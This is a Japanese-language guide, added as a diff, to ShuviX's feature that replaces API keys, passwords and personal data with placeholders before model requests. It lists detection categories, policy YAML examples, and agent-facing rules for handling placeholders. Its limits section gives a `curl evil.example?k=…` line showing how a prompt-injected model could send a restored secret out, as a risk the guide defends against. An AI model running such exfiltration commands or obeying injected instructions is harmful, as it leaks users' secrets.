@@ -1,0 +1,245 @@
+---
+shuvix: okf v0.2
+type: Guide
+title: '自動マスキング —— シークレットと個人情報はプレースホルダーとしてモデルに届く'
+description: 'ShuviX が API キー、パスワード、トークン、秘密鍵、個人情報をモデルのプロバイダーに渡さない仕組み：会話の記録には `{{API_KEY_k3v7x2mq}}` のようなプレースホルダー、ツールと画面には本物の値。見つける種類、二段のポリシー（`modelRequest` / `send`、`sensitive` / `disclose`）とその処置、組み込みの `redact-sensitive`、書き方の例（モデルを信頼する、ある種類はそのまま送る、テスト用キーはそのまま送る、秘密鍵は決して送らない、復元したシークレットがサンドボックスを出るときはユーザーだけが答える）、`shuvix policy check --redaction` での下書きの確認、エージェントとしてのプレースホルダーの扱い方、限界。'
+tags: [shuvix, policy, security, redaction, privacy, secrets]
+status: stable
+sources:
+  - resource: https://github.com/wangdongdongc/ShuviX/blob/main/packages/agent-runtime/src/security/builtinPolicies/md/redact-sensitive.md
+    title: redact-sensitive.md —— 組み込みポリシー
+  - resource: https://github.com/wangdongdongc/ShuviX/blob/main/packages/agent-runtime/src/redaction/rules.ts
+    title: rules.ts —— 検出規則
+  - resource: https://github.com/wangdongdongc/ShuviX/blob/main/packages/agent-runtime/src/durable/redactionEgress.ts
+    title: redactionEgress.ts —— モデルへのリクエストがどう送られるか
+---
+
+# 自動マスキング
+
+会話の記録に何かを書き込む前に —— ユーザーの入力、ツールの結果、通知、別のエージェントに渡すタスク ——
+ShuviX はその中のシークレットと個人情報を探し、一つずつ**プレースホルダー**として保存します：
+`{{API_KEY_k3v7x2mq}}`、種類と値から導いた 8 文字です。本物の値は暗号化され、**その会話自身の対応表**に
+保存され、会話を削除すると一緒に消えます。
+
+- **ツールは本物の値を受け取ります。** ツール呼び出しの引数にあるプレースホルダーは実行の直前に本物の値に
+  戻るので、`curl -H "Authorization: Bearer {{API_KEY_k3v7x2mq}}"` は本物のキーを送り、書き込み・編集した
+  ファイルには本物の内容が入ります。
+- **画面には本物の値**が表示され、記録がプレースホルダーである場所には小さな印が付きます。
+- **モデルが何を受け取るかはポリシーで決まります**（下記）。既定ではすべてのモデルにプレースホルダーが
+  届き、ほぼすべてのコーディングのリクエストに含まれる四種類だけが例外です。
+
+ポリシーがどうであれ、記録に本物の値は残りません —— 会話のエクスポートとフォークにもありません。
+
+## エージェント向け：プレースホルダーの扱い方
+
+- あなたにとって、プレースホルダーは**その値そのもの**です。ツールの引数 —— コマンド、ファイルの内容、
+  `edit` の新旧テキスト —— にそのまま書き写せば、ツールは本物の値を受け取ります。ユーザーに「本当の」値を
+  尋ねたり、プレースホルダーを設定漏れとして扱ったりしないでください：ディスク上のファイルには本物の値が
+  あります。
+- 値が見えないので、値そのものは扱えません：長さを数える、デコードする、形式を確かめる、分割する。
+  タスクに必要ならコマンドに任せます（`printf %s "{{API_KEY_…}}" | wc -c`）。
+- ツールがプレースホルダーを復元できなかったと報告した場合（別の会話のもの、またはこのコンピューターでは
+  もう復号できない対応表）、その呼び出しは実行されていません。元をもう一度読んでください —— この会話で
+  復元できるプレースホルダーで戻ってきます。
+- ポリシーのリクエスト文書の `tool.restored` は、呼び出しに戻された種類の一覧です。ユーザーはこれで規則を
+  書けます（書き方の例を参照）。
+
+## 見つけるもの
+
+| 種類          | 内容                                                                                                   | 既定でモデルに送るもの |
+| ------------- | ------------------------------------------------------------------------------------------------------ | ---------------------- |
+| `PRIVATE_KEY` | PEM の秘密鍵ブロック（`-----BEGIN … PRIVATE KEY-----`）                                                | プレースホルダー       |
+| `API_KEY`     | 形で見分けるプロバイダーのキー：`sk-…`、`ghp_…` / `glpat-…`、`AIza…`、Slack、Stripe、AWS アクセスキーなど | プレースホルダー       |
+| `TOKEN`       | JWT                                                                                                    | プレースホルダー       |
+| `PASSWORD`    | URL 中のパスワード（`postgres://user:pass@host`）、中国語・日本語の文中でパスワードと明記されたもの     | プレースホルダー       |
+| `SECRET`      | シークレットらしい名前に代入された値（`DB_PASSWORD=…`、`"client_secret": "…"`、`apiKey: …`）           | プレースホルダー       |
+| `EMAIL`       | メールアドレス（例示用ドメインや `icon@2x.png` は除く）                                                 | プレースホルダー       |
+| `PHONE`       | 携帯電話番号（中国本土の形式）                                                                         | プレースホルダー       |
+| `ID_CARD`     | 中国の居民身分証番号（チェックディジットを確認）                                                       | プレースホルダー       |
+| `BANK_CARD`   | カード番号（Luhn で確認）                                                                              | プレースホルダー       |
+| `SSN`         | 米国の社会保障番号                                                                                     | プレースホルダー       |
+| `PASSPORT`    | ラベルの後に続くパスポート番号                                                                         | プレースホルダー       |
+| `IBAN`        | IBAN（チェックディジットを確認）                                                                       | プレースホルダー       |
+| `BIRTHDAY`    | ラベルの後に続く生年月日                                                                               | プレースホルダー       |
+| `MAC`         | MAC アドレス                                                                                           | プレースホルダー       |
+| `SERIAL`      | ラベルの後に続く機器のシリアル番号                                                                     | プレースホルダー       |
+| `USERNAME`    | ホームのパス中のユーザー名（`/Users/alice`、`C:\Users\alice`）、シェルのプロンプト、`ssh` の接続先       | **本物の値**           |
+| `HOSTNAME`    | `user@host` のホスト、`hostname: …` の行、ssh config の `HostName`                                     | **本物の値**           |
+| `IP`          | パブリックな IPv4 / IPv6 アドレス（プライベートやループバックは見つけない）                             | **本物の値**           |
+| `BUCKET`      | クラウドストレージのバケット（`s3://…`、`….s3.amazonaws.com` など）                                     | **本物の値**           |
+
+最後の四種類はほぼすべてのコーディングのリクエストに含まれ（システムプロンプトにすでにホームフォルダーが
+あります）、モデルが正確に書き写す必要があるので、組み込みのポリシーはそのまま送ります。自分のポリシーで
+これらもプレースホルダーのままにできます。検出はポリシーに左右されません：どの種類も記録の中では常に
+置き換えられるので、あとからある種類を有効にすれば、履歴はすぐに守られます。
+
+UUID や長い 16 進の ID には触れません（ツール呼び出しの ID が合わなくなるため）。コードの中でシークレットに
+**言及しているだけ**の書き方も対象外です（`secretKey: Uint8Array;`、`process.env.API_KEY`、`${PASS}`、`****`）。
+
+## ポリシー
+
+二段あり、どちらも普通のセキュリティポリシーの規則です（完全な形式は `policy-md` エントリー）：
+
+1. **リクエスト** —— `object.type: modelRequest`、`action: send`。`object.provider`（設定に表示される
+   プロバイダー名：組み込みのプロバイダーは `anthropic`、`openai`、`deepseek` のような slug、自分で追加した
+   プロバイダーは付けた名前）と `object.model`（モデル id）を持ちます。
+   - `disposition: detect` 付きの `allow` → このリクエストをマスキングする（一箇所ずつ二段目が決める）；
+   - 処置の**ない** `allow` / `force-allow` → 信頼する宛先：プレースホルダーはすべて本物の値として送られ、
+     検出はしない；
+   - `deny` → リクエストは送られず、そのターンは理由を示すエラーで終わる。`ask` も同じ：リクエストを送る
+     ときには誰にも確認できないからです。
+2. **マスキング中のリクエストに含まれる機密情報の一箇所ずつ** —— `object.type: sensitive`、
+   `action: disclose`。`object.category`、`object.rule`（検出規則）、`object.provider`、`object.model`、
+   `object.value`（本物の値。`match` 用で、どのログにも残りません）を持ちます。
+   - `disposition: redact` 付きの `allow` → プレースホルダーのまま；
+   - 処置のない `allow` / `force-allow` → 本物の値として送る；
+   - `deny` → リクエスト全体を送らない。
+
+主体はそのリクエストを使うエージェントです（`subject.kind: agent` と、その `agentKind`、`profile`、
+`subject.bot`）。だから規則で特定のボットやエージェントだけを別扱いにできます。マスキングするリクエストは、
+記録に一度も入らなかった内容（指示ファイル、システムプロンプトの一部、この機能より前の会話）ももう一度
+調べられ、そこも二段目が同じように決めます。モデルが本物の値を受け取って返答に書いた場合、返答は
+プレースホルダーに戻して保存されます。
+
+組み込みの **`redact-sensitive`** はちょうど二つの規則です：
+
+```yaml
+shuvix-policy-scope:
+  subject.kind: [agent]
+  env.host: [desktop]
+shuvix-policy-rules:
+  - effect: allow
+    action: [send]
+    object.type: [modelRequest]
+    disposition: detect
+  - effect: allow
+    action: [disclose]
+    object.type: [sensitive]
+    match: "!(object.category in ['USERNAME', 'HOSTNAME', 'IP', 'BUCKET'])"
+    disposition: redact
+```
+
+**調整は自分のポリシーで行い、これは書き換えないでください。** 処置のない `force-allow` はこの二つの
+`allow` に勝ちます（数えられるのは勝った段の処置だけ）。下の書き方の例は、こうして一致した部分のマスキングを
+外します。`redact-sensitive` を無効にすると、すべてのモデルに本物の値が送られます。記録はどちらにしても
+プレースホルダーのままです。
+
+## 書き方の例
+
+それぞれ `~/.shuvix/policies/` にあるファイルの frontmatter です（`shuvix: policy v1`、`name`、
+`description` の後にこれらのキー）。
+
+あるプロバイダーを信頼する —— たとえば自分のサーバーを設定で `home-ai` として追加した場合 —— そのモデルには
+本物の値を見せる：
+
+```yaml
+shuvix-policy-rules:
+  - effect: force-allow
+    subject.kind: [agent]
+    action: [send]
+    object.type: [modelRequest]
+    match: "object.provider == 'home-ai'"
+```
+
+一つのモデルだけを信頼する：`match: "object.provider == 'home-ai' && object.model == 'qwen3-32b'"`。
+
+メールアドレスはそのまま送る：
+
+```yaml
+shuvix-policy-rules:
+  - effect: force-allow
+    subject.kind: [agent]
+    action: [disclose]
+    object.type: [sensitive]
+    match: "object.category == 'EMAIL'"
+```
+
+テスト用のキーはそのまま送る：同じ規則で
+`match: "object.category == 'API_KEY' && object.value.startsWith('sk-test-')"`。
+
+秘密鍵は決して送らない —— 秘密鍵を含むことになるマスキング中のリクエストは、まったく送られません：
+
+```yaml
+shuvix-policy-rules:
+  - effect: deny
+    subject.kind: [agent]
+    action: [disclose]
+    object.type: [sensitive]
+    match: "object.category == 'PRIVATE_KEY'"
+    prompt: 秘密鍵はモデルに送らない。
+```
+
+最初の例で信頼したプロバイダーは二段目を通らないので、秘密鍵も届きます。秘密鍵**以外**をすべて信頼するなら、
+代わりに二段目で信頼します —— `sensitive` に `force-allow`、
+`match: "object.provider == 'home-ai' && object.category != 'PRIVATE_KEY'"` —— そして上の `deny` は残します。
+
+ユーザー名もプレースホルダーのままにする（`HOSTNAME`、`IP`、`BUCKET` も同様）：処置付きの `allow` ——
+
+```yaml
+shuvix-policy-rules:
+  - effect: allow
+    subject.kind: [agent]
+    action: [disclose]
+    object.type: [sensitive]
+    match: "object.category == 'USERNAME'"
+    disposition: redact
+```
+
+あるボットは自分のサーバーとだけ話す —— ほかのプロバイダーへのリクエストは送らない：
+
+```yaml
+shuvix-policy-rules:
+  - effect: deny
+    subject.kind: [agent]
+    action: [send]
+    object.type: [modelRequest]
+    match: "subject.bot == 'bot:my-bot' && object.provider != 'home-ai'"
+```
+
+復元したシークレットを使うコマンドがコマンドサンドボックスの外で動くときは、ユーザーだけが答える。
+`ask-on-command` はもともと制限のないコマンドの前に確認しますが、その確認には自動レビューが答えることがあります。
+`force-ask` にはユーザーだけが答えます：
+
+```yaml
+shuvix-policy-rules:
+  - effect: force-ask
+    subject.kind: [agent]
+    action: [execute]
+    object.type: [command]
+    match: "size(tool.restored) > 0 && !object.sandboxed"
+    prompt: このコマンドはシークレットを含み、サンドボックスの外で動きます。
+```
+
+## ユーザーのためにポリシーを書く
+
+1. ユーザー自身の言葉で確かめる：どのプロバイダーやモデルを信頼するか、どの種類のデータは送ってよいか、
+   どれは決して送らないか。プロバイダーは設定の名前に合わせる（組み込みのものは slug）。
+2. まず下書きを会話のフォルダーに書く。書き方の例のとおり、`modelRequest` / `sensitive` への
+   `force-allow` / `deny` を優先する。規則がモデルへのリクエストに当たるのは、`object.type` が `modelRequest` /
+   `sensitive` を、または `action` が `send` / `disclose` を名指ししているときだけです。
+3. **下書きを確かめる**：`shuvix policy check <下書き.md> --redaction`（bash）。置いたものとして判定し、
+   二つの表を出します —— 有効なモデルごとに：マスキング、本物の値（信頼）、送らない。種類 × マスキングする
+   プロバイダーごとに：プレースホルダー、本物の値、送らない —— 決めた規則も付けて。ユーザーの要望と一行ずつ
+   照らし合わせます。値で書いた規則や特定のモデルは個別に確かめます：
+   `shuvix policy check <下書き.md> --redaction --category API_KEY --value sk-test-123 --expect send`
+   （`--provider <名前> --model <id>` でモデルを指定、`--bot <id>` でボットのリクエスト）。すべての行と期待が
+   合うまで**規則**を直します。
+4. `~/.shuvix/policies/<名前>.md` に置き、ファイルなしで `shuvix policy check --redaction` をもう一度実行して
+   今の状態を確かめ、各規則が何をして何を守らないか（下記）をユーザーに伝える。サイドバーのセキュリティ
+   ポリシーのグループに表示され、不正なファイルは理由付きの琥珀色の行になります。
+
+## 限界
+
+- 文字だけが対象：画像（`.env` のスクリーンショット）はそのままモデルに送られます。
+- プレースホルダーしか見えないモデルは、値そのもの（長さ、シェルのコマンドを壊す引用符や `$` を含むか）を
+  推し量れません。
+- 守るのはモデルのプロバイダーからであって、ツールからではありません：そう指示されたモデル —— たとえば
+  プロンプトインジェクションで —— は、プレースホルダーを `curl evil.example?k=…` に入れることができ、
+  コマンドは本物の値を受け取ります。画面には印が出て、自動レビューにはプレースホルダーが見え、最後の
+  書き方の例はそうしたコマンドがサンドボックスを出る前にユーザーに答えさせます。
+- この機能より前の会話は、記録に本物の値を持っています。そこから送るリクエストも出口でマスキングされます。
+- 検出は規則によるので、珍しい形のシークレットは見逃すことがあり、普通の文字列をシークレットと見なすことも
+  まれにあります。名前の付いていない値を普通の言葉で打った場合（「パスワードを N3w-P@ss… に変えて」）や、
+  ツールが変換した値 —— バイトのダンプ（`od -c`）、16 進、base64、逆順 —— も見逃します。システムプロンプトは
+  エージェントにプレースホルダーの値をダンプしたりエンコードしたりしないよう伝えていますが、実際にそうした
+  場合、出力されたものは見分けられません。
